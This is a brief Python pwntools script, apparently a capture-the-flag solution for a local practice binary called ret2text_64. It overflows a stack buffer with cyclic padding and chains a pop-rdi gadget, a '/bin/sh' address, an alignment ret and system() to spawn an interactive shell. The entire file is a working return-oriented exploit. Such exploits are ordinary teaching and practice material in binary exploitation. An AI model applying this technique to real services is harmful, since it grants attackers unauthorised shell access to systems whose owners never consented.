from pwn import *

context.arch = 'amd64'
context.log_level = "debug"

io = process("./ret2text_64")
elf = ELF("./ret2text_64")

pop_rdi_ret = 0x0040123d
bin_sh = 0x00404050
ret = 0x0040101a

io.sendlineafter(b"age?\n", b"1000")

payload = flat([
    cyclic(0x40 + 8),
    pop_rdi_ret,
    bin_sh,
    ret,
    elf.sym["system"]
])
io.sendlineafter(b"overflow!\n", payload)

io.interactive()
